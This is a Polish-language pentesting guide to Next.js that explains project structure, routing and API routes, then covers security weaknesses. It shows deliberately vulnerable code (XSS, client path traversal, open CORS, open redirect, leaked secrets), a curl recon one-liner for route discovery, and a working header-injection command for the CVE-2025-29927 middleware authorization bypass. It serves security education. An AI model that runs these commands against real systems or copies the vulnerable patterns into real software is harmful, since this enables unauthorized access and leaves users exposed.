# NextJS

{{#include ../../banners/hacktricks-training.md}}

## Ogólna architektura aplikacji Next.js

### Typowa struktura plików

Standardowy projekt Next.js stosuje określoną strukturę plików i katalogów, która ułatwia korzystanie z funkcji takich jak routing, API endpoints i zarządzanie zasobami statycznymi. Oto typowy układ:
```lua
my-nextjs-app/
├── node_modules/
├── public/
│   ├── images/
│   │   └── logo.png
│   └── favicon.ico
├── app/
│   ├── api/
│   │   └── hello/
│   │       └── route.ts
│   ├── layout.tsx
│   ├── page.tsx
│   ├── about/
│   │   └── page.tsx
│   ├── dashboard/
│   │   ├── layout.tsx
│   │   └── page.tsx
│   ├── components/
│   │   ├── Header.tsx
│   │   └── Footer.tsx
│   ├── styles/
│   │   ├── globals.css
│   │   └── Home.module.css
│   └── utils/
│       └── api.ts
├── .env.local
├── next.config.js
├── tsconfig.json
├── package.json
├── README.md
└── yarn.lock / package-lock.json

```
### Główne katalogi i pliki

- **public/:** Przechowuje zasoby statyczne takie jak obrazy, fonty i inne pliki. Pliki tutaj są dostępne pod ścieżką root (`/`).
- **app/:** Główny katalog aplikacji zawierający strony, layouty, komponenty i trasy API. Wykorzystuje paradygmat **App Router**, umożliwiając zaawansowane funkcje routingu oraz separację komponentów po stronie serwera i klienta.
- **app/layout.tsx:** Definiuje root layout aplikacji, obejmując wszystkie strony i dostarczając spójne elementy UI, takie jak nagłówki, stopki i paski nawigacji.
- **app/page.tsx:** Służy jako punkt wejścia dla głównej ścieżki `/`, renderując stronę główną.
- **app/[route]/page.tsx:** Obsługuje trasy statyczne i dynamiczne. Każdy folder w `app/` reprezentuje segment ścieżki, a `page.tsx` w tych folderach odpowiada za komponent trasy.
- **app/api/:** Zawiera trasy API, pozwalające na tworzenie funkcji serverless obsługujących żądania HTTP. Te trasy zastępują tradycyjny katalog `pages/api`.
- **app/components/:** Miejsce dla wielokrotnego użytku komponentów React, które można wykorzystywać na różnych stronach i layoutach.
- **app/styles/:** Zawiera globalne pliki CSS oraz CSS Modules do stylowania ograniczonego do komponentów.
- **app/utils/:** Zawiera funkcje pomocnicze, moduły utilitarne i inną logikę niezwiązaną z UI, którą można współdzielić w aplikacji.
- **.env.local:** Przechowuje zmienne środowiskowe specyficzne dla lokalnego środowiska deweloperskiego. Te zmienne **nie** są dodawane do kontroli wersji.
- **next.config.js:** Dostosowuje zachowanie Next.js, w tym konfiguracje webpack, zmienne środowiskowe i ustawienia bezpieczeństwa.
- **tsconfig.json:** Konfiguruje ustawienia TypeScript dla projektu, włączając sprawdzanie typów i inne funkcje TypeScript.
- **package.json:** Zarządza zależnościami projektu, skryptami i metadanymi.
- **README.md:** Zawiera dokumentację i informacje o projekcie, w tym instrukcje konfiguracji, wskazówki użycia i inne istotne informacje.
- **yarn.lock / package-lock.json:** Zabezpiecza wersje zależności projektu, zapewniając spójne instalacje w różnych środowiskach.

## Po stronie klienta w Next.js

### Routing oparty na plikach w katalogu `app`

Katalog `app` jest podstawą routingu w najnowszych wersjach Next.js. Wykorzystuje system plików do definiowania tras, co czyni zarządzanie trasami intuicyjnym i skalowalnym.

<details>

<summary>Obsługa ścieżki głównej /</summary>

**Struktura plików:**
```arduino
my-nextjs-app/
├── app/
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Kluczowe pliki:**

- **`app/page.tsx`**: Obsługuje żądania na ścieżce głównej `/`.
- **`app/layout.tsx`**: Definiuje układ aplikacji, obejmujący wszystkie strony.

**Implementacja:**
```tsx
tsxCopy code// app/page.tsx

export default function HomePage() {
return (
<div>
<h1>Welcome to the Home Page!</h1>
<p>This is the root route.</p>
</div>
);
}
```
**Wyjaśnienie:**

- **Definicja trasy:** Plik `page.tsx` bezpośrednio w katalogu `app` odpowiada ścieżce `/`.
- **Renderowanie:** Ten komponent renderuje zawartość strony głównej.
- **Integracja layoutu:** Komponent `HomePage` jest opakowany przez `layout.tsx`, który może zawierać nagłówki, stopki i inne wspólne elementy.

</details>

<details>

<summary>Obsługa innych statycznych ścieżek</summary>

**Przykład: trasa `/about`**

**Struktura plików:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── about/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementacja:**
```tsx
// app/about/page.tsx

export default function AboutPage() {
return (
<div>
<h1>About Us</h1>
<p>Learn more about our mission and values.</p>
</div>
)
}
```
**Wyjaśnienie:**

- **Definicja trasy:** Plik `page.tsx` wewnątrz folderu `about` odpowiada za trasę `/about`.
- **Renderowanie:** Ten komponent renderuje zawartość strony about.

</details>

<details>

<summary>Trasy dynamiczne</summary>

Trasy dynamiczne umożliwiają obsługę ścieżek ze zmiennymi segmentami, dzięki czemu aplikacje mogą wyświetlać zawartość na podstawie parametrów, takich jak ID, slugi itp.

**Przykład: trasa `/posts/[id]`**

**Struktura plików:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── posts/
│   │   └── [id]/
│   │       └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementacja:**
```tsx
tsxCopy code// app/posts/[id]/page.tsx

import { useRouter } from 'next/navigation';

interface PostProps {
params: { id: string };
}

export default function PostPage({ params }: PostProps) {
const { id } = params;
// Fetch post data based on 'id'

return (
<div>
<h1>Post #{id}</h1>
<p>This is the content of post {id}.</p>
</div>
);
}
```
**Wyjaśnienie:**

- **Dynamic Segment:** `[id]` oznacza segment dynamiczny w ścieżce, przechwytując parametr `id` z URL.
- **Dostęp do parametrów:** Obiekt `params` zawiera parametry dynamiczne, dostępne wewnątrz komponentu.
- **Dopasowanie ścieżki:** Każda ścieżka pasująca do `/posts/*`, na przykład `/posts/1`, `/posts/abc` itd., będzie obsługiwana przez ten komponent.

</details>

<details>

<summary>Zagnieżdżone trasy</summary>

Next.js obsługuje routing zagnieżdżony, umożliwiając hierarchiczne struktury ścieżek odpowiadające układowi katalogów.

**Przykład: trasa `/dashboard/settings/profile`**

**Struktura plików:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── dashboard/
│   │   ├── settings/
│   │   │   └── profile/
│   │   │       └── page.tsx
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementacja:**
```tsx
tsxCopy code// app/dashboard/settings/profile/page.tsx

export default function ProfileSettingsPage() {
return (
<div>
<h1>Profile Settings</h1>
<p>Manage your profile information here.</p>
</div>
);
}
```
**Wyjaśnienie:**

- **Głębokie zagnieżdżenie:** Plik `page.tsx` wewnątrz `dashboard/settings/profile/` odpowiada ścieżce `/dashboard/settings/profile`.
- **Odwzorowanie hierarchii:** Struktura katalogów odzwierciedla ścieżkę URL, ułatwiając utrzymanie i czytelność.

</details>

<details>

<summary>Trasy catch-all</summary>

Trasy catch-all obsługują wiele zagnieżdżonych segmentów lub nieznane ścieżki, zapewniając elastyczność w obsłudze tras.

**Przykład: trasa `/*`**

**Struktura plików:**
```arduino
my-nextjs-app/
├── app/
│   ├── [...slug]/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementacja:**
```tsx
// app/[...slug]/page.tsx

interface CatchAllProps {
params: { slug: string[] }
}

export default function CatchAllPage({ params }: CatchAllProps) {
const { slug } = params
const fullPath = `/${slug.join("/")}`

return (
<div>
<h1>Catch-All Route</h1>
<p>You have navigated to: {fullPath}</p>
</div>
)
}
```
**Wyjaśnienie:**

- **Catch-All Segment:** `[...slug]` przechwytuje wszystkie pozostałe segmenty ścieżki jako tablicę.
- **Usage:** Przydatne do obsługi dynamicznych scenariuszy routingu, takich jak ścieżki tworzone przez użytkowników, zagnieżdżone kategorie itp.
- **Route Matching:** Ścieżki takie jak `/anything/here`, `/foo/bar/baz`, itp. są obsługiwane przez ten komponent.

</details>

### Potencjalne podatności po stronie klienta

Chociaż Next.js zapewnia bezpieczne podstawy, nieprawidłowe praktyki kodowania mogą wprowadzić podatności. Kluczowe podatności po stronie klienta to:

<details>

<summary>Cross-Site Scripting (XSS)</summary>

Ataki XSS występują, gdy złośliwe skrypty są wstrzykiwane do zaufanych stron internetowych. Atakujący mogą uruchamiać skrypty w przeglądarkach użytkowników, kradnąc dane lub wykonując akcje w imieniu użytkownika.

**Przykład podatnego kodu:**
```jsx
// Dangerous: Injecting user input directly into HTML
function Comment({ userInput }) {
return <div dangerouslySetInnerHTML={{ __html: userInput }} />
}
```
**Dlaczego to jest podatne:** Używanie `dangerouslySetInnerHTML` z niezaufanymi danymi wejściowymi pozwala atakującym wstrzykiwać złośliwe skrypty.

</details>

<details>

<summary>Client-Side Template Injection</summary>

Występuje, gdy dane wejściowe użytkownika są niewłaściwie obsługiwane w szablonach, umożliwiając atakującym wstrzyknięcie i wykonanie szablonów lub wyrażeń.

**Przykład podatnego kodu:**
```jsx
import React from "react"
import ejs from "ejs"

function RenderTemplate({ template, data }) {
const html = ejs.render(template, data)
return <div dangerouslySetInnerHTML={{ __html: html }} />
}
```
**Dlaczego to jest podatne:** Jeśli `template` lub `data` zawierają złośliwą zawartość, może to doprowadzić do wykonania niezamierzonego kodu.

</details>

<details>

<summary>Client Path Traversal</summary>

To podatność, która pozwala atakującym manipulować ścieżkami po stronie klienta w celu wykonania niezamierzonych działań, takich jak Cross-Site Request Forgery (CSRF). W przeciwieństwie do server-side path traversal, który atakuje system plików serwera, CSPT koncentruje się na wykorzystywaniu mechanizmów po stronie klienta, aby przekierowywać prawidłowe żądania API do złośliwych endpointów.

**Przykład podatnego kodu:**

Aplikacja Next.js pozwala użytkownikom na przesyłanie i pobieranie plików. Funkcja pobierania jest zaimplementowana po stronie klienta, gdzie użytkownicy mogą podać ścieżkę pliku do pobrania.
```jsx
// pages/download.js
import { useState } from "react"

export default function DownloadPage() {
const [filePath, setFilePath] = useState("")

const handleDownload = () => {
fetch(`/api/files/${filePath}`)
.then((response) => response.blob())
.then((blob) => {
const url = window.URL.createObjectURL(blob)
const a = document.createElement("a")
a.href = url
a.download = filePath
a.click()
})
}

return (
<div>
<h1>Download File</h1>
<input
type="text"
value={filePath}
onChange={(e) => setFilePath(e.target.value)}
placeholder="Enter file path"
/>
<button onClick={handleDownload}>Download</button>
</div>
)
}
```
#### Scenariusz ataku

1. **Attacker's Objective**: Wykonać atak CSRF, aby usunąć krytyczny plik (np. `admin/config.json`) poprzez manipulację `filePath`.
2. **Exploiting CSPT**:
- **Malicious Input**: Atakujący konstruuje URL z zmanipulowanym `filePath`, np. `../deleteFile/config.json`.
- **Resulting API Call**: Kod po stronie client-side wykonuje żądanie do `/api/files/../deleteFile/config.json`.
- **Server's Handling**: Jeśli server nie waliduje `filePath`, przetwarza żądanie, potencjalnie usuwając lub ujawniając wrażliwe pliki.
3. **Executing CSRF**:
- **Crafted Link**: Atakujący wysyła ofierze link lub osadza złośliwy skrypt, który wywołuje żądanie pobrania z zmanipulowanym `filePath`.
- **Outcome**: Ofiara nieświadomie wykonuje akcję, prowadząc do nieautoryzowanego dostępu do plików lub ich usunięcia.

</details>

### Recon: static export route discovery via _buildManifest

When `nextExport`/`autoExport` are true (static export), Next.js exposes the `buildId` in the HTML and serves a build manifest at `/_next/static/<buildId>/_buildManifest.js`. The `sortedPages` array and route→chunk mapping there enumerate every prerendered page without brute force.

- Grab the buildId from the root response (often printed at the bottom) or from `<script>` tags loading `/_next/static/<buildId>/...`.
- Fetch the manifest and extract routes:
```bash
build=$(curl -s http://target/ | grep -oE '"buildId":"[^"]+"' | cut -d: -f2 | tr -d '"')
curl -s "http://target/_next/static/${build}/_buildManifest.js" | grep -oE '"(/[a-zA-Z0-9_\[\]\-/]+)"' | tr -d '"'
```
- Użyj odkrytych ścieżek (na przykład `/docs`, `/docs/content/examples`, `/signin`) do prowadzenia auth testing i endpoint discovery.

## Po stronie serwera w Next.js

### Renderowanie po stronie serwera (SSR)

Strony są renderowane po stronie serwera przy każdym żądaniu, co zapewnia, że użytkownik otrzymuje w pełni wyrenderowany HTML. W takim przypadku powinieneś stworzyć własny niestandardowy serwer do obsługi żądań.

**Przypadki użycia:**

- Dynamiczna zawartość, która często się zmienia.
- Optymalizacja pod kątem SEO, ponieważ wyszukiwarki mogą indeksować w pełni wyrenderowaną stronę.

**Implementacja:**
```jsx
// pages/index.js
export async function getServerSideProps(context) {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data } }
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### Statyczne generowanie stron (SSG)

Strony są wstępnie renderowane podczas budowania, co skutkuje szybszym czasem ładowania i zmniejszonym obciążeniem serwera.

**Zastosowania:**

- Treści, które nie zmieniają się często.
- Blogi, dokumentacja, strony marketingowe.

**Implementacja:**
```jsx
// pages/index.js
export async function getStaticProps() {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data }, revalidate: 60 } // Revalidate every 60 seconds
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### Serverless Functions (API Routes)

Next.js pozwala na tworzenie endpointów API jako funkcji serverless. Te funkcje uruchamiają się na żądanie bez potrzeby dedykowanego serwera.

**Use Cases:**

- Obsługa przesyłania formularzy.
- Interakcja z bazami danych.
- Przetwarzanie danych lub integracja z zewnętrznymi API.

**Implementation:**

Z wprowadzeniem katalogu `app` w Next.js 13, routing i obsługa API stały się bardziej elastyczne i wydajne. To nowoczesne podejście ściśle współgra z systemem routingu opartym na plikach, ale wprowadza rozszerzone możliwości, w tym obsługę komponentów po stronie serwera i klienta.

#### Basic Route Handler

**File Structure:**
```go
my-nextjs-app/
├── app/
│   └── api/
│       └── hello/
│           └── route.js
├── package.json
└── ...
```
**Implementacja:**
```javascript
// app/api/hello/route.js

export async function POST(request) {
return new Response(JSON.stringify({ message: "Hello from App Router!" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

// Client-side fetch to access the API endpoint
fetch("/api/submit", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ name: "John Doe" }),
})
.then((res) => res.json())
.then((data) => console.log(data))
```
**Wyjaśnienie:**

- **Lokalizacja:** Trasy API umieszczone są w katalogu `app/api/`.
- **Nazewnictwo plików:** Każdy endpoint API znajduje się w osobnym folderze zawierającym plik `route.js` lub `route.ts`.
- **Eksportowane funkcje:** Zamiast pojedynczego domyślnego eksportu, eksportuje się funkcje odpowiadające konkretnym metodom HTTP (np. `GET`, `POST`).
- **Obsługa odpowiedzi:** Użyj konstruktora `Response` do zwracania odpowiedzi, co daje większą kontrolę nad nagłówkami i kodami statusu.

#### Jak obsługiwać inne ścieżki i metody:

<details>

<summary>Obsługa konkretnych metod HTTP</summary>

Next.js 13+ pozwala zdefiniować funkcje obsługi dla konkretnych metod HTTP w tym samym pliku `route.js` lub `route.ts`, co prowadzi do czytelniejszego i lepiej zorganizowanego kodu.

**Przykład:**
```javascript
// app/api/users/[id]/route.js

export async function GET(request, { params }) {
const { id } = params
// Fetch user data based on 'id'
return new Response(JSON.stringify({ userId: id, name: "Jane Doe" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function PUT(request, { params }) {
const { id } = params
// Update user data based on 'id'
return new Response(JSON.stringify({ message: `User ${id} updated.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function DELETE(request, { params }) {
const { id } = params
// Delete user based on 'id'
return new Response(JSON.stringify({ message: `User ${id} deleted.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**Wyjaśnienie:**

- **Wiele eksportów:** Każda metoda HTTP (`GET`, `PUT`, `DELETE`) ma własną eksportowaną funkcję.
- **Parametry:** Drugi argument umożliwia dostęp do parametrów trasy za pomocą `params`.
- **Rozszerzone odpowiedzi:** Większa kontrola nad obiektami odpowiedzi, umożliwiająca precyzyjne zarządzanie nagłówkami i kodami statusu.

</details>

<details>

<summary>Catch-All i zagnieżdżone trasy</summary>

Next.js 13+ obsługuje zaawansowane funkcje routingu, takie jak trasy catch-all i zagnieżdżone trasy API, pozwalając na bardziej dynamiczne i skalowalne struktury API.

**Przykład trasy catch-all:**
```javascript
// app/api/[...slug]/route.js

export async function GET(request, { params }) {
const { slug } = params
// Handle dynamic nested routes
return new Response(JSON.stringify({ slug }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**Wyjaśnienie:**

- **Składnia:** `[...]` oznacza segment typu catch-all, przechwytujący wszystkie zagnieżdżone ścieżki.
- **Użycie:** Przydatne dla API, które muszą obsługiwać różną głębokość tras lub dynamiczne segmenty.

**Przykład zagnieżdżonych tras:**
```javascript
// app/api/posts/[postId]/comments/[commentId]/route.js

export async function GET(request, { params }) {
const { postId, commentId } = params
// Fetch specific comment for a post
return new Response(
JSON.stringify({ postId, commentId, comment: "Great post!" }),
{
status: 200,
headers: { "Content-Type": "application/json" },
}
)
}
```
**Wyjaśnienie:**

- **Głębokie zagnieżdżenie:** Umożliwia hierarchiczne struktury API, odzwierciedlając relacje zasobów.
- **Dostęp do parametrów:** Umożliwia łatwy dostęp do wielu parametrów trasy za pomocą obiektu `params`.

</details>

<details>

<summary>Obsługa tras API w Next.js 12 i wcześniejszych</summary>

## Trasy API w katalogu `pages` (Next.js 12 i wcześniejsze)

Zanim Next.js 13 wprowadził katalog `app` i rozszerzone możliwości routingu, trasy API były głównie definiowane w katalogu `pages`. Podejście to jest nadal szeroko stosowane i obsługiwane w Next.js 12 i wcześniejszych wersjach.

#### Podstawowa trasa API

**Struktura plików:**
```go
goCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── hello.js
├── package.json
└── ...
```
**Implementacja:**
```javascript
javascriptCopy code// pages/api/hello.js

export default function handler(req, res) {
res.status(200).json({ message: 'Hello, World!' });
}
```
**Wyjaśnienie:**

- **Lokalizacja:** Trasy API znajdują się w katalogu `pages/api/`.
- **Eksport:** Użyj `export default`, aby zdefiniować funkcję obsługi.
- **Sygnatura funkcji:** Funkcja obsługi otrzymuje obiekty `req` (żądanie HTTP) i `res` (odpowiedź HTTP).
- **Routing:** Nazwa pliku (`hello.js`) odpowiada endpointowi `/api/hello`.

#### Dynamiczne trasy API

**Struktura plików:**
```bash
bashCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── users/
│           └── [id].js
├── package.json
└── ...
```
**Implementacja:**
```javascript
javascriptCopy code// pages/api/users/[id].js

export default function handler(req, res) {
const {
query: { id },
method,
} = req;

switch (method) {
case 'GET':
// Fetch user data based on 'id'
res.status(200).json({ userId: id, name: 'John Doe' });
break;
case 'PUT':
// Update user data based on 'id'
res.status(200).json({ message: `User ${id} updated.` });
break;
case 'DELETE':
// Delete user based on 'id'
res.status(200).json({ message: `User ${id} deleted.` });
break;
default:
res.setHeader('Allow', ['GET', 'PUT', 'DELETE']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**Wyjaśnienie:**

- **Dynamiczne segmenty:** Nawiasy kwadratowe (`[id].js`) oznaczają dynamiczne segmenty ścieżki.
- **Dostęp do parametrów:** Użyj `req.query.id`, aby uzyskać dostęp do dynamicznego parametru.
- **Obsługa metod:** Użyj logiki warunkowej do obsługi różnych metod HTTP (`GET`, `PUT`, `DELETE`, itd.).

#### Obsługa różnych metod HTTP

Chociaż podstawowy przykład API route obsługuje wszystkie metody HTTP w jednej funkcji, możesz zorganizować swój kod tak, aby każda metoda była obsługiwana osobno — zapewnia to lepszą czytelność i łatwiejsze utrzymanie.

**Przykład:**
```javascript
javascriptCopy code// pages/api/posts.js

export default async function handler(req, res) {
const { method } = req;

switch (method) {
case 'GET':
// Handle GET request
res.status(200).json({ message: 'Fetching posts.' });
break;
case 'POST':
// Handle POST request
res.status(201).json({ message: 'Post created.' });
break;
default:
res.setHeader('Allow', ['GET', 'POST']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**Najlepsze praktyki:**

- **Oddzielenie odpowiedzialności:** Wyraźnie rozdziel logikę dla różnych metod HTTP.
- **Spójność odpowiedzi:** Zapewnij spójne struktury odpowiedzi, aby ułatwić przetwarzanie po stronie klienta.
- **Obsługa błędów:** Odpowiednio obsługuj nieobsługiwane metody i nieoczekiwane błędy.

</details>

### Konfiguracja CORS

Kontroluj, które originy mogą uzyskać dostęp do twoich tras API, ograniczając podatności związane z Cross-Origin Resource Sharing (CORS).

**Przykład złej konfiguracji:**
```javascript
// app/api/data/route.js

export async function GET(request) {
return new Response(JSON.stringify({ data: "Public Data" }), {
status: 200,
headers: {
"Access-Control-Allow-Origin": "*", // Allows any origin
"Access-Control-Allow-Methods": "GET, POST, PUT, DELETE",
},
})
}
```
Zauważ, że **CORS można również skonfigurować we wszystkich trasach API** w pliku **`middleware.ts`**:
```javascript
// app/middleware.ts

import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(request: NextRequest) {
const allowedOrigins = [
"https://yourdomain.com",
"https://sub.yourdomain.com",
]
const origin = request.headers.get("Origin")

const response = NextResponse.next()

if (allowedOrigins.includes(origin || "")) {
response.headers.set("Access-Control-Allow-Origin", origin || "")
response.headers.set(
"Access-Control-Allow-Methods",
"GET, POST, PUT, DELETE, OPTIONS"
)
response.headers.set(
"Access-Control-Allow-Headers",
"Content-Type, Authorization"
)
// If credentials are needed:
// response.headers.set('Access-Control-Allow-Credentials', 'true');
}

// Handle preflight requests
if (request.method === "OPTIONS") {
return new Response(null, {
status: 204,
headers: response.headers,
})
}

return response
}

export const config = {
matcher: "/api/:path*", // Apply to all API routes
}
```
**Problem:**

- **`Access-Control-Allow-Origin: '*'`:** Zezwala dowolnej stronie na dostęp do API, co może pozwolić złośliwym serwisom na interakcję z Twoim API bez ograniczeń.
- **Wide Method Allowance:** Zezwalanie na wszystkie metody może umożliwić atakującym wykonywanie niepożądanych działań.

**How attackers exploit it:**

Atakujący mogą tworzyć złośliwe strony, które wysyłają żądania do Twojego API, potencjalnie nadużywając funkcji takich jak pobieranie danych, modyfikacja danych lub wywoływanie niechcianych akcji w imieniu uwierzytelnionych użytkowników.


{{#ref}}
../../pentesting-web/cors-bypass.md
{{#endref}}

### Ujawnienie kodu serwera po stronie klienta

Łatwo jest **użyć kodu wykorzystywanego po stronie serwera również w kodzie udostępnionym i używanym po stronie klienta**. Najlepszym sposobem, aby upewnić się, że plik z kodem nigdy nie zostanie ujawniony po stronie klienta, jest użycie tego importu na początku pliku:
```js
import "server-only"
```
## Kluczowe pliki i ich role

### `middleware.ts` / `middleware.js`

**Lokalizacja:** Katalog główny projektu lub w `src/`.

**Cel:** Wykonuje kod po stronie serwera (funkcja serverless) przed przetworzeniem żądania, umożliwiając zadania takie jak uwierzytelnianie, przekierowania lub modyfikacja odpowiedzi.

**Przepływ wykonania:**

1. **Nadchodzące żądanie:** middleware przechwytuje żądanie.
2. **Przetwarzanie:** Wykonuje operacje na podstawie żądania (np. sprawdzenie uwierzytelnienia).
3. **Modyfikacja odpowiedzi:** Może zmienić odpowiedź lub przekazać kontrolę do następnego handlera.

**Przykładowe zastosowania:**

- Przekierowywanie niezalogowanych użytkowników.
- Dodawanie niestandardowych nagłówków.
- Logowanie żądań.

**Przykładowa konfiguracja:**
```typescript
// middleware.ts
import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(req: NextRequest) {
const url = req.nextUrl.clone()
if (!req.cookies.has("token")) {
url.pathname = "/login"
return NextResponse.redirect(url)
}
return NextResponse.next()
}

export const config = {
matcher: ["/protected/:path*"],
}
```
### Middleware authorization bypass (CVE-2025-29927)

Jeśli autoryzacja jest wymuszana w middleware, podatne wydania Next.js (<12.3.5 / 13.5.9 / 14.2.25 / 15.2.3) można obejść poprzez wstrzyknięcie nagłówka `x-middleware-subrequest`. Framework pominie rekursję middleware i zwróci chronioną stronę.

- Domyślne zachowanie to zazwyczaj przekierowanie 307 do trasy logowania, np. `/api/auth/signin`.
- Wyślij długą wartość `x-middleware-subrequest` (powtarzaj `middleware`, aby osiągnąć `MAX_RECURSION_DEPTH`), aby przełączyć odpowiedź na 200:
```bash
curl -i "http://target/docs" \
-H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
```
- Ponieważ strony uwierzytelnione pobierają wiele subzasobów, dodaj nagłówek do każdego żądania (np. Burp Match/Replace z pustym ciągiem dopasowania), aby zapobiec przekierowywaniu zasobów.

### `next.config.js`

**Lokalizacja:** Katalog główny projektu.

**Cel:** Konfiguruje zachowanie Next.js, włączając lub wyłączając funkcje, dostosowując konfiguracje webpack, ustawiając zmienne środowiskowe oraz konfigurując różne funkcje bezpieczeństwa.

**Kluczowe konfiguracje bezpieczeństwa:**

<details>

<summary>Nagłówki bezpieczeństwa</summary>

Nagłówki bezpieczeństwa zwiększają bezpieczeństwo Twojej aplikacji, instruując przeglądarki, jak obsługiwać zawartość. Pomagają ograniczyć różne ataki, takie jak Cross-Site Scripting (XSS), Clickjacking oraz MIME type sniffing:

- Content Security Policy (CSP)
- X-Frame-Options
- X-Content-Type-Options
- Strict-Transport-Security (HSTS)
- Referrer Policy

**Przykłady:**
```javascript
// next.config.js

module.exports = {
async headers() {
return [
{
source: "/(.*)", // Apply to all routes
headers: [
{
key: "X-Frame-Options",
value: "DENY",
},
{
key: "Content-Security-Policy",
value:
"default-src *; script-src 'self' 'unsafe-inline' 'unsafe-eval';",
},
{
key: "X-Content-Type-Options",
value: "nosniff",
},
{
key: "Strict-Transport-Security",
value: "max-age=63072000; includeSubDomains; preload", // Enforces HTTPS
},
{
key: "Referrer-Policy",
value: "no-referrer", // Completely hides referrer
},
// Additional headers...
],
},
]
},
}
```
</details>

<details>

<summary>Ustawienia optymalizacji obrazów</summary>

Next.js optymalizuje obrazy pod kątem wydajności, ale błędne konfiguracje mogą prowadzić do luk bezpieczeństwa, np. pozwalając niezaufanym źródłom na wstrzyknięcie złośliwej zawartości.

**Przykład złej konfiguracji:**
```javascript
// next.config.js

module.exports = {
images: {
domains: ["*"], // Allows images from any domain
},
}
```
**Problem:**

- **`'*'`:** Pozwala na ładowanie obrazów z dowolnego zewnętrznego źródła, w tym z niezaufanych lub złośliwych domen. Atakujący mogą hostować obrazy zawierające złośliwe payloady lub treści wprowadzające użytkowników w błąd.
- Innym problemem może być umożliwienie domeny **gdzie każdy może przesłać obraz** (np. `raw.githubusercontent.com`)

**How attackers abuse it:**

Wstrzykując obrazy ze złośliwych źródeł, atakujący mogą przeprowadzać phishing, wyświetlać wprowadzające w błąd informacje lub wykorzystywać luki w bibliotekach renderujących obrazy.

</details>

<details>

<summary>Environment Variables Exposure</summary>

Zarządzaj poufnymi informacjami, takimi jak API keys i database credentials, w sposób bezpieczny, nie ujawniając ich klientowi.

#### a. Exposing Sensitive Variables

**Bad Configuration Example:**
```javascript
// next.config.js

module.exports = {
env: {
SECRET_API_KEY: process.env.SECRET_API_KEY, // Not exposed to the client
NEXT_PUBLIC_API_URL: process.env.NEXT_PUBLIC_API_URL, // Correctly prefixed for exposure to client
},
}
```
**Problem:**

- **`SECRET_API_KEY`:** Bez prefiksu `NEXT_PUBLIC_`, Next.js nie udostępnia zmiennych po stronie klienta. Jednak jeśli omyłkowo dodany zostanie prefiks (np. `NEXT_PUBLIC_SECRET_API_KEY`), stają się one dostępne po stronie klienta.

**How attackers abuse it:**

Jeżeli wrażliwe zmienne są ujawnione po stronie klienta, atakujący mogą je odzyskać poprzez analizę kodu po stronie klienta lub żądań sieciowych, uzyskując nieautoryzowany dostęp do API, baz danych lub innych usług.

</details>

<details>

<summary>Przekierowania</summary>

Zarządzaj przekierowaniami i przepisaniami URL w swojej aplikacji, upewniając się, że użytkownicy są kierowani poprawnie, bez wprowadzania open redirect vulnerabilities.

#### a. Open Redirect Vulnerability

**Zły przykład konfiguracji:**
```javascript
// next.config.js

module.exports = {
async redirects() {
return [
{
source: "/redirect",
destination: (req) => req.query.url, // Dynamically redirects based on query parameter
permanent: false,
},
]
},
}
```
**Problem:**

- **Dynamic Destination:** Pozwala użytkownikom określić dowolny URL, umożliwiając ataki typu open redirect.
- **Trusting User Input:** Przekierowania do URL-i podanych przez użytkowników bez walidacji mogą prowadzić do phishing, malware distribution lub credential theft.

**How attackers abuse it:**

Atakujący mogą przygotować URL-e, które wyglądają, jakby pochodziły z Twojej domeny, ale przekierowują użytkowników na złośliwe strony. Na przykład:
```bash
https://yourdomain.com/redirect?url=https://malicious-site.com
```
Użytkownicy ufający oryginalnej domenie mogą nieświadomie trafić na złośliwe strony internetowe.

</details>

<details>

<summary>Webpack Configuration</summary>

Dostosowywanie konfiguracji Webpack dla aplikacji Next.js może nieumyślnie wprowadzić luki bezpieczeństwa, jeśli nie jest wykonywane ostrożnie.

#### a. Ujawnianie wrażliwych modułów

**Błędny przykład konfiguracji:**
```javascript
// next.config.js

module.exports = {
webpack: (config, { isServer }) => {
if (!isServer) {
config.resolve.alias["@sensitive"] = path.join(__dirname, "secret-folder")
}
return config
},
}
```
**Problem:**

- **Ujawnianie wrażliwych ścieżek:** Aliasowanie wrażliwych katalogów i umożliwienie dostępu po stronie klienta może spowodować leak poufnych informacji.
- **Pakowanie sekretów:** Jeśli wrażliwe pliki są pakowane dla klienta, ich zawartość staje się dostępna przez source maps lub inspekcję kodu po stronie klienta.

**Jak atakujący to wykorzystują:**

Atakujący mogą uzyskać dostęp do struktury katalogów aplikacji lub ją zrekonstruować, co może prowadzić do znalezienia i wykorzystania wrażliwych plików lub danych.

</details>

### `pages/_app.js` i `pages/_document.js`

#### **`pages/_app.js`**

**Cel:** Nadpisuje domyślny komponent App, umożliwiając globalny stan, style i komponenty układu.

**Zastosowania:**

- Wstrzykiwanie globalnego CSS.
- Dodawanie wrapperów układu.
- Integracja bibliotek zarządzania stanem.

**Przykład:**
```jsx
// pages/_app.js
import "../styles/globals.css"

